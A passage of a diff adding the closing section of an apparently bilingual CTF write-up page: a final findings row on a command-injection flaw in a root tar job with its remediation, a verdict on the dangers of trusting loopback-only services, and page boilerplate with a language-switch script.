+        <tr><td data-it="&lt;code&gt;report&lt;/code&gt; concatenato in &lt;code&gt;tar&lt;/code&gt; come root" data-en="&lt;code&gt;report&lt;/code&gt; concatenated into &lt;code&gt;tar&lt;/code&gt; as root"><code>report</code> concatenato in <code>tar</code> come root</td><td class="ok" data-it="nome file su allowlist, niente shell, e far girare il job con privilegi minimi (non root)" data-en="allowlist the filename, no shell, and run the job least-privilege (not root)">nome file su allowlist, niente shell, e far girare il job con privilegi minimi (non root)</td></tr>
+      </tbody>
+    </table>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// verdetto" data-en="// verdict">// verdetto</div>
+  <p data-it="Due volte lo stesso errore — input utente in una shell — agli estremi opposti della catena, tenuti insieme da segreti che viaggiano dove non dovrebbero (un config verboso, una segreteria telefonica). Nessun passo è esotico; è la &lt;strong&gt;fiducia in loopback&lt;/strong&gt; a fare il danno: «tanto è solo interno» smette di valere nell'istante in cui metti piede sul box. In una frase: &lt;strong&gt;un servizio non è sicuro perché ascolta su 127.0.0.1 — lo è solo se non si fida di chi gli parla.&lt;/strong&gt;" data-en="The same mistake twice — user input in a shell — at opposite ends of the chain, held together by secrets travelling where they shouldn't (a chatty config, a voicemail). No step is exotic; it's &lt;strong&gt;loopback trust&lt;/strong&gt; that does the damage: &quot;it's internal-only&quot; stops being true the instant you set foot on the box. In one line: &lt;strong&gt;a service isn't safe because it listens on 127.0.0.1 — it's safe only if it doesn't trust whoever talks to it.&lt;/strong&gt;">Due volte lo stesso errore — input utente in una shell — agli estremi opposti della catena, tenuti insieme da segreti che viaggiano dove non dovrebbero (un config verboso, una segreteria telefonica). Nessun passo è esotico; è la <strong>fiducia in loopback</strong> a fare il danno: «tanto è solo interno» smette di valere nell'istante in cui metti piede sul box. In una frase: <strong>un servizio non è sicuro perché ascolta su 127.0.0.1 — lo è solo se non si fida di chi gli parla.</strong></p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Finfinity-pool%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Finfinity-pool%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
